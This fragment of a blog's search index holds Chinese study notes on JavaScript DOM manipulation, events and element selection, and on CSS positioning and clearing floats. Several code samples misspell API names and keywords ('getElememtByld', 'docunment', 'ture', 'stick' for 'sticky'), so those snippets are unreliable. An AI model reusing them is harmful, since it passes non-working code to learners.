增加</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> d2=+<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d2-d1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>();</span><br><span class="line"><span class="comment">//3. innerHTML用数组   10-ms</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> d1=+<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array=[ ];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;   <span class="comment">//拼接</span></span><br><span class="line">array.<span class="title function_">push</span>(<span class="string">&#x27;&lt;div  style=&quot;width:100px; height:2px; boder:1px solid blue;&quot;&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span>=array.<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> d2=+<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d2-d1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js事件操作</title>
      <link href="/learningNotes/js/03%E4%BA%8B%E4%BB%B6%E6%93%8D%E4%BD%9C"/>
      <url>/learningNotes/js/03%E4%BA%8B%E4%BB%B6%E6%93%8D%E4%BD%9C</url>
      
        <content type="html"><![CDATA[<h3 id="1.改变元素内容">1.改变元素内容<a title="#1.改变元素内容" href="#1.改变元素内容"></a></h3><ul><li><p>element.innerText<br>从起始位置到终止位置的内容，但它去除html标签，同时空格和换行也会去掉</p></li><li><p>element.innerHTML<br>起始位置到终止位置的全部内容，包括html标签，同时保留空格和换行</p></li><li><p>innerText  和  innerHTML ：<br>innerText  不识别 html 标签   非标准    去除空格和换行<br>innerHTML  识别html代码  W3C标准   保留空格和换行</p><p>这两个属性是可读写的  可以获取元素里的内容</p></li></ul><h3 id="2.改变元素属性">2.改变元素属性<a title="#2.改变元素属性" href="#2.改变元素属性"></a></h3><p><code>element.属性='属性值'</code></p><h3 id="3.表单元素的属性操作">3.表单元素的属性操作<a title="#3.表单元素的属性操作" href="#3.表单元素的属性操作"></a></h3><p>（type、value、checked、selected、disabled禁用）</p><p><code>input.type/value/checked/selected/disabled=''</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;button&gt;按钮&lt;button&gt;</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;text&quot;  value=&quot;输入内容&quot;&gt;</span></span><br><span class="line"><span class="comment">//1.获取元素</span></span><br><span class="line"><span class="keyword">var</span> btn=docunment.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> input=<span class="variable language_">document</span>.<span class="title function_">quertSelsector</span>(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line"><span class="comment">//2.注册事件  处理程序</span></span><br><span class="line">btn.<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="comment">//input.innerHTML=&#x27;点击了&#x27;；这个是 普通盒子  比如标签里面的内容  </span></span><br><span class="line"><span class="comment">//表单里面的值  文字内容是通过  value  来修改的</span></span><br><span class="line">input.<span class="property">value</span>=<span class="string">&#x27;被点击了&#x27;</span>；</span><br><span class="line"><span class="comment">//如果想要某个表单被禁用  disabled</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">disabled</span>=ture;<span class="comment">//==btn.disabled=true;</span></span><br><span class="line"><span class="comment">//this 指向的是事件函数的调用者</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4.样式属性操作">4.样式属性操作<a title="#4.样式属性操作" href="#4.样式属性操作"></a></h3><ol><li><code>element.style</code>   行内样式操作   样式少  功能简单</li><li><code>element.className</code>  类名样式操作  多    样式多  功能复杂</li></ol><h4 id="4.1-element.style">4.1 element.style<a title="#4.1-element.style" href="#4.1-element.style"></a></h4><p>样式用驼峰命名法 比如fontSize    JS修改的style样式操作   产生行内样式 css权重较高</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// div&#123;  width:200px;  height:200px;  background-color:pink; &#125;</span></span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line"><span class="comment">//1.获取元素</span></span><br><span class="line"><span class="keyword">var</span> div=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="comment">//2.</span></span><br><span class="line">div.<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="comment">//div.style        </span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">backgroundColor</span>=<span class="string">&#x27;purple&#x27;</span>;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">width</span>=<span class="string">&#x27;250px&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4.2-element.classname">4.2 element.className<a title="#4.2-element.classname" href="#4.2-element.classname"></a></h4><p>覆盖所有类名</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.<span class="property">change</span>&#123; .......  &#125;</span><br><span class="line"><span class="comment">// &lt;div class=&quot;first&quot;&gt;文本&lt;div&gt;</span></span><br><span class="line"><span class="keyword">var</span>  test=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">text.<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="comment">//当前元素的类名  改为change</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">className</span>=<span class="string">&#x27;change&#x27;</span>;</span><br><span class="line"><span class="comment">//if想保留原先类名  </span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">className</span>=<span class="string">&#x27;first  change&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5.操作元素之排他思想">5.操作元素之排他思想<a title="#5.操作元素之排他思想" href="#5.操作元素之排他思想"></a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//1.获取元素  </span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> btns = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;button&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//btns得到的是伪数组  里面的每一个元素 btns[i]</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; btns.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">            btns[i].<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// console.log(&quot;第&quot; +  + &quot;被点击了&quot;);</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; btns.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// btns[i].style.background = &#x27;none&#x27;;</span></span></span><br><span class="line"><span class="language-javascript">                    btns[i].<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&#x27;pink&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="6.自定义属性的操作">6.自定义属性的操作<a title="#6.自定义属性的操作" href="#6.自定义属性的操作"></a></h3><ol><li><p>获取属性值</p><p><code>element.属性</code>： 内置的属性</p><p><code>element.getAttribute('属性') </code> ：主要获取自定义属性</p></li><li><p>设置属性值</p><p><code>element.属性='值'</code>：主要内置属性</p><p><code>element.setAttribute('属性'，'值')</code>:  主要自定义属性</p></li><li><p>移除属性</p><p>element.removeAttribute(‘属性’);</p></li></ol><h3 id="7.-h5自定义属性">7. h5自定义属性<a title="#7.-h5自定义属性" href="#7.-h5自定义属性"></a></h3><ol><li><p>设置h5自定义属性</p><blockquote><p>h5自定义属性data-开头作为属性名并且赋值</p></blockquote><p><code>&lt;div data-index=&quot;1&quot;&gt;&lt;/div&gt;</code> / <code> element.setAttribute('data-index',2);</code></p></li><li><p>获取h5自定义属性<br>兼容性获取: element.getAttribute(‘data-index’);<br>h5新增: element.dataset.index或者element.dataset[‘index’]</p><blockquote><p>dataset是一个集合里存放了所有以data开头的自定义属性</p><p>//多个用驼峰式命名<br>自定义属性为   data-list-name=‘andy’<br>element.getAttribute(‘data-list-name’)<br>element.dataset.listName<br>element.dataset[‘listName’]</p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js获取元素</title>
      <link href="/learningNotes/js/01%E8%8E%B7%E5%8F%96%E5%85%83%E7%B4%A0"/>
      <url>/learningNotes/js/01%E8%8E%B7%E5%8F%96%E5%85%83%E7%B4%A0</url>
      
        <content type="html"><![CDATA[<ol><li><p>根据ID获取：<code>var elememt=document.getElememtByld(id);</code></p><p>返回值：object  元素对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;div id=&#x27;time&#x27;&gt;2019-9-9&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> timer=<span class="variable language_">document</span>.<span class="title function_">getElememtByld</span>(<span class="string">&#x27;time&#x27;</span>);  </span><br></pre></td></tr></table></figure></li><li><p>根据标签名获取： <code>document.getElememtsByTagName('标签名');</code></p><p>返回带有指定标签名的对象的集合</p><p>返回值：获取过来元素对象集合   以伪数组的形式储存</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;ul&gt; &lt;li&gt;xxxxxx&lt;li&gt; &lt;li&gt;xxxxxx&lt;li&gt; &lt;li&gt;xxxxxx&lt;li&gt; &lt;/ul&gt;</span></span><br><span class="line"> <span class="keyword">var</span> lis=<span class="variable language_">document</span>.<span class="title function_">getElememtsByTagName</span>(<span class="string">&#x27;li&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 因为是集合，所以if操作里面的元素可遍历 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;lis.<span class="property">length</span>;i++)&#123;   </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(lis[i])  </span><br><span class="line">&#125;         </span><br></pre></td></tr></table></figure></li><li><p>得到元素里面的某些标签：<code>elememt.getElememtsByTagName('标签名');</code></p></li></ol>   <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;ul&gt;</span></span><br><span class="line"><span class="comment">// &lt;li&gt;xxxxxx&lt;li&gt;&lt;li&gt;xxxxxx&lt;li&gt;&lt;li&gt;xxxxxx&lt;li&gt;</span></span><br><span class="line"><span class="comment">// &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">// &lt;ul id=&#x27;nav&#x27;&gt;</span></span><br><span class="line"><span class="comment">// &lt;li&gt;ooooo&lt;li&gt;&lt;li&gt;oooo&lt;li&gt;&lt;li&gt;ooooo&lt;li&gt;</span></span><br><span class="line"><span class="comment">// &lt;/ul&gt;</span></span><br><span class="line"><span class="keyword">var</span> nav=<span class="variable language_">document</span>.<span class="title function_">getElememtByld</span>(<span class="string">&#x27;nav&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> navLis=nav.<span class="title function_">getElememtsByTagName</span>(<span class="string">&#x27;li&#x27;</span>);</span><br></pre></td></tr></table></figure><ol start="4"><li><p>通过类名获取：<code>document.getElememtsByClassName('类名');</code></p><p>根据类名返回元素对象集合  同上伪数组形式存储</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;div class=&#x27;box&#x27;&gt;盒子&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;div class=&#x27;box&#x27;&gt;盒子&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;div id=&#x27;nav&#x27;&gt; &lt;ul&gt;  &lt;li&gt;首页&lt;/li&gt; &lt;li&gt;产品&lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> boxs=<span class="variable language_">document</span>.<span class="title function_">getElememtsByClassName</span>(<span class="string">&#x27;box&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>根据选择器获取（一个）：<code>document.querySelector('选择器');</code></p><p>返回指定选择器的第一个元素对象  要加符号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;div class=&#x27;box&#x27;&gt;盒子1&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;div class=&#x27;box&#x27;&gt;盒子2&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;div id=&#x27;nav&#x27;&gt; &lt;ul&gt;  &lt;li&gt;首页&lt;/li&gt; &lt;li&gt;产品&lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> firstBox=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.box&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> nav=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#nav&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> li=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;li&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>根据选择器获取（所有）：<code>document.querySelectorAll('选择器');</code></p><p>返回指定选择器的所有元素对象  要加符号</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;div class=&#x27;box&#x27;&gt;盒子1&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;div class=&#x27;box&#x27;&gt;盒子2&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;div id=&#x27;nav&#x27;&gt; &lt;ul&gt;  &lt;li&gt;首页&lt;/li&gt; &lt;li&gt;产品&lt;/li&gt;  &lt;/ul&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> allBox=<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.box&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lis=<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;li&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>获取body元素：<code>document.body</code></p></li><li><p>获取html元素：<code>document.documentElememt</code></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js事件基础</title>
      <link href="/learningNotes/js/02%E4%BA%8B%E4%BB%B6%E5%9F%BA%E7%A1%80"/>
      <url>/learningNotes/js/02%E4%BA%8B%E4%BB%B6%E5%9F%BA%E7%A1%80</url>
      
        <content type="html"><![CDATA[<h3 id="1.事件基础：">1.事件基础：<a title="#1.事件基础：" href="#1.事件基础："></a></h3><p>简单理解为：触发–相应机制</p><h3 id="2.事件组成：">2.事件组成：<a title="#2.事件组成：" href="#2.事件组成："></a></h3><p>事件源 事件类型 事件处理程序–事件三要素</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// &lt;botton id=&quot;btn&quot;&gt;按钮&lt;/button&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//1.事件源  事件被触发的对象</span></span><br><span class="line"><span class="keyword">var</span> btn=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"><span class="comment">//2.事件类型 如何触发           事件：鼠标点击onclick</span></span><br><span class="line"><span class="comment">//3.事件处理程序  通过一个函数赋值的方式  完成</span></span><br><span class="line">btn.<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;   </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;点击按钮&#x27;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="3.执行事件的步骤：">3.执行事件的步骤：<a title="#3.执行事件的步骤：" href="#3.执行事件的步骤："></a></h3><ul><li><p>获取事件源</p></li><li><p>注册事件（绑定事件）</p></li><li><p>添加事件处理程序（采用函数赋值形式）</p></li></ul><h3 id="4.常见鼠标事件：">4.常见鼠标事件：<a title="#4.常见鼠标事件：" href="#4.常见鼠标事件："></a></h3><ul><li>onclick         点击左键</li><li>onmouseover   鼠标经过</li><li>onmouseout     鼠标离开</li><li>onfocus         获得鼠标焦点</li><li>onblur         失去鼠标焦点</li><li>onmousemove 鼠标移动</li><li>onmouseup      鼠标弹起</li><li>onmousedown 鼠标按下</li></ul>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>position</title>
      <link href="/learningNotes/further/position"/>
      <url>/learningNotes/further/position</url>
      
        <content type="html"><![CDATA[<p>css <strong>position</strong> 属性用于指定一个元素在文档中的定位方式。top、right、bottom、left 属性决定了该元素的最终位置。</p><h4 id="定位类型">定位类型<a title="#定位类型" href="#定位类型"></a></h4><ul><li><p><code>static</code></p><p>指定元素使用正常的布局行为，即元素在文档常规流中当前的布局位置。</p><blockquote><p>此时 <code>top</code>, <code>right</code>, <code>bottom</code>, <code>left</code> 和 <code>z-index </code>属性无效。</p></blockquote></li><li><p><code>relative</code></p><p>元素先放置在未添加定位时的位置，再在不改变页面布局的前提下调整元素位置（因此会在此元素未添加定位时所在位置留下空白）。</p><blockquote><p><code>position:relative </code> 对 <code>table-*-group</code>, <code>table-row</code>, <code>table-column</code>, <code>table-cell</code>,<code> table-caption</code> 元素无效。</p></blockquote></li><li><p><code>absolute</code></p><p>元素会被移出正常文档流，并不为元素预留空间，通过指定元素相对于最近的非 static 定位祖先元素的偏移，来确定元素位置。</p><blockquote><p>绝对定位的元素可以设置外边距（margins），且不会与其他边距合并。</p></blockquote></li><li><p><code>fixed</code></p><p>元素会被移出正常文档流，并不为元素预留空间，而是通过指定元素相对于屏幕视口（viewport）的位置来指定元素位置。元素的位置在屏幕滚动时不会改变。打印时，元素会出现在的每页的固定位置。</p><blockquote><p><code>fixed</code> 属性会创建新的层叠上下文。当元素祖先的 <code>transform</code>, <code>perspective</code> 或 <code>filter</code> 属性非 <code>none</code> 时，容器由视口改为该祖先。</p></blockquote></li><li><p><code>stick</code></p><p>元素根据正常文档流进行定位，然后相对它的*最近滚动祖先（nearest scrolling ancestor）*和 <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Containing_block" target="_blank">containing block</a> (最近块级祖先 nearest block-level ancestor)，包括table-related元素，基于<code>top</code>, <code>right</code>, <code>bottom</code>, 和 <code>left</code>的值进行偏移。偏移值不会影响任何其他元素的位置。</p><blockquote><p>须指定 <code>top</code>, <code>right</code>, <code>bottom</code>或<code>left</code>四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。</p></blockquote></li></ul><h4 id="定位的特殊性">定位的特殊性<a title="#定位的特殊性" href="#定位的特殊性"></a></h4><p>绝对定位和固定定位和浮动相似：</p><ol><li>行内元素添加绝对/固定定位，可直接设置宽高</li><li>块级元素添加绝对/固定定位，if不给宽/高，默认大小是内容大小</li><li>脱标（浮动/绝对/固定）的盒子不会触发外边距塌陷</li></ol>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浮动和清除浮动</title>
      <link href="/learningNotes/further/%E6%B5%AE%E5%8A%A8%20%E5%92%8C%20%E6%B8%85%E9%99%A4%20%E6%B5%AE%E5%8A%A8"/>
      <url>/learningNotes/further/%E6%B5%AE%E5%8A%A8%20%E5%92%8C%20%E6%B8%85%E9%99%A4%20%E6%B5%AE%E5%8A%A8</url>
      
        <content type="html"><![CDATA[<h4 id="1.浮动是什么">1.浮动是什么<a title="#1.浮动是什么" href="#1.浮动是什么"></a></h4><p>float CSS属性指定一个元素应沿其容器的左侧或右侧放置，允许文本和内联元素环绕它。该元素从网页的正常流动(文档流)中移除，尽管仍然保持部分的流动性。</p><h4 id="2.-值">2. 值<a title="#2.-值" href="#2.-值"></a></h4><ul><li><code>left</code> 表明元素必须浮动在其所在的块容器左侧的关键字。</li><li><code>right</code> 表明元素必须浮动在其所在的块容器右侧的关键字。</li><li><code>none</code> 表明元素不进行浮动的关键字。</li><li><code>inline-start</code> 关键字，表明元素必须浮动在其所在块容器的开始一侧，在ltr脚本中是左侧，在rtl脚本中是右侧。</li><li><code>inline-end</code> 关键字，表明元素必须浮动在其所在块容器的结束一侧，在ltr脚本中是右侧，在rtl脚本中是左侧。</li></ul><h4 id="3.浮动的特性">3.浮动的特性<a title="#3.浮动的特性" href="#3.浮动的特性"></a></h4><ul><li>脱离标准流</li><li>浮动的元素之间不会有缝隙</li><li>浮动元素具有行内块特征</li></ul><h4 id="4.为什么要清除浮动">4.为什么要清除浮动<a title="#4.为什么要清除浮动" href="#4.为什么要清除浮动"></a></h4><p>一般在使用浮动的时候：父元素是标准流的，而且一般不设置高度，而其子元素都设置为浮动的话，父元素高度塌陷 == 0。会影响到父元素下面的兄弟元素在文档中的位置（一般其兄弟元素会被浮动元素叠在下面）。</p><h4 id="5.清除浮动的方法">5.清除浮动的方法<a title="#5.清除浮动的方法" href="#5.清除浮动的方法"></a></h4><ul><li><p>额外标签法：</p><p>在所有浮动元素后面加一个元素，如<code>div</code>，为这个块级元素添加 <code>clear:both;</code> 的样式</p></li><li><p><code>::after</code> 伪元素：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span>&#123;   <span class="comment">/* .clearfix 是标准流的父元素 */</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">    *zoom: <span class="number">1</span>;<span class="comment">/* 触发hasLayout 兼容ie6、7 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>双伪元素：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::before</span>, <span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">    *zoom: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>父元素触发<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context" target="_blank">BFC</a>：</p><p>最常见的做法是将父元素的 <code>overflow</code> 设置为除 <code>visible</code> 的值。</p><p>可以根据不同页面的需求使用不同的方法触发父元素BFC，在不同的场景有的方法可能不能起到清除浮动的效果。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
